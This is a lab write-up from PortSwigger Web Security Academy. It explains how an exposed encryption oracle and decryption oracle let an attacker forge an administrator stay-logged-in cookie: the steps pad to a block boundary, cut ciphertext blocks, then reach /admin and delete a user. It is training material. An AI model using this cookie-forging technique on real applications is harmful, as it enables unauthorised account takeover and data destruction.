# Authentication bypass via encryption oracle


**PortSwigger Web Security Academy — Practitioner Lab**



## Objective



Exploit a logic flaw involving exposed encryption and decryption functionality to authenticate as the `administrator` user and delete 
`carlos`.



Credentials:



```text

wiener:peter

```



---



## Vulnerability



The application exposes both an **encryption oracle** and a **decryption oracle**.



### Encryption Oracle



The `email` parameter of the comment functionality is encrypted and returned in the `notification` cookie.



For example:



```http

POST /post/comment

```



with:



```text

email=xxxxxxxxxadministrator:TIMESTAMP

```



causes the application to return:



```http

Set-Cookie: notification=<encrypted-value>

```



### Decryption Oracle



The `notification` cookie is subsequently decrypted by the application and reflected in the error message.



Therefore, we can:


```text

Plaintext → Encryption Oracle → Ciphertext

Ciphertext → Decryption Oracle → Plaintext

```



This allows us to manipulate encrypted authentication-related data.



---



## 1. Discover the encrypted `stay-logged-in` format



Log in as:



```text

wiener:peter

```


with **Stay logged in** enabled.




Capture the login request and the resulting:



```text

stay-logged-in

```



cookie.



Send the comment request and the subsequent post request to Burp Repeater.



Use the post request as the decryption oracle by replacing:



```http

notification=<value>

```



with the value of the user's:



```text

stay-logged-in=<value>

```



The decrypted value is:




```text

wiener:1791232681969

```



This reveals the format:



```text

username:timestamp

```



The timestamp from the current lab session is:



```text

1791232681969

```



---




## 2. Use the encryption oracle



Modify the `email` parameter in the comment request:




```text

email=administrator:1791232681969


```



The application automatically prepends:



```text

Invalid email address:

```



Therefore, the encrypted plaintext becomes:



```text

Invalid email address: administrator:1791232681969

```



We need to remove the unwanted prefix.



---



## 3. Align the plaintext to encryption blocks




The unwanted prefix is:



```text

Invalid email address:

```


which is **23 bytes** long.



The block size is:



```text

16 bytes

```




Add 9 characters:



```text

xxxxxxxxx

```



Now:



```text


23 + 9 = 32 bytes


```



and:




```text

32 = 2 × 16

```



Therefore, the input becomes:



```text
xxxxxxxxxadministrator:1791232681969

```


and the encrypted plaintext is:


```text

Invalid email address: xxxxxxxxxadministrator:1791232681969

```



---


## 4. Remove the first two ciphertext blocks



Take the resulting `notification` cookie and decode it in Burp Decoder:


```text

URL Decode

↓

Base64 Decode

```



The resulting ciphertext is divided into 16-byte blocks.



Remove the first:


```text

32 bytes

```



which corresponds to:



```text

2 × 16-byte blocks

```



The remaining ciphertext corresponds to the desired plaintext:




```text

administrator:1791232681969


```


---



## 5. Re-encode the modified ciphertext



After deleting the first 32 bytes:



```text

Raw ciphertext

↓

Base64 Encode

↓

URL Encode

```



Place the resulting value into:




```http

Cookie: notification=<modified-ciphertext>

```



Send the request to the decryption oracle.

The response should now contain:



```text

administrator:1791232681969

```



without the original:



```text

Invalid email address:

```



This confirms that the modified ciphertext decrypts to the desired value.


---




## 6. Authentication bypass



Take the modified ciphertext and use it as the:



```text

stay-logged-in

```




cookie.



Remove the normal:



```text


session

```


cookie.




Then send:


```http

GET /

```



The application now authenticates us as:


```text

administrator

```



---



## 7. Access the admin panel



Request:




```http

GET /admin

```



The admin panel is now accessible.



Delete `carlos` using:



```http

GET /admin/delete?username=carlos

```





## Result



```text


Lab solved


```


---



## Key Takeaways



- An **encryption oracle** can allow attackers to encrypt attacker-controlled plaintext.

- A **decryption oracle** can reveal plaintext corresponding to attacker-controlled ciphertext.

- Exposing both oracles can create a serious cryptographic logic flaw.

- Block-based encryption operates on fixed-size blocks, so ciphertext manipulation must respect block boundaries.

- The attack did **not** require recovering the encryption key.

- The vulnerability came from the application's insecure use of encryption as part of an authentication mechanism.


### Attack Flow


```text
Encryption Oracle

        ↓

Decrypt stay-logged-in cookie

        ↓

Discover username:timestamp format

        ↓

Encrypt administrator:timestamp

        ↓

Add 9-byte padding
        ↓

Remove first 32 bytes

        ↓


Obtain administrator:timestamp ciphertext

        ↓
Use as stay-logged-in cookie

        ↓

Administrator access
        ↓

/admin

        ↓

Delete carlos

```


## Reference


PortSwigger Web Security Academy:


[Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle?utm_source=chatgpt.com)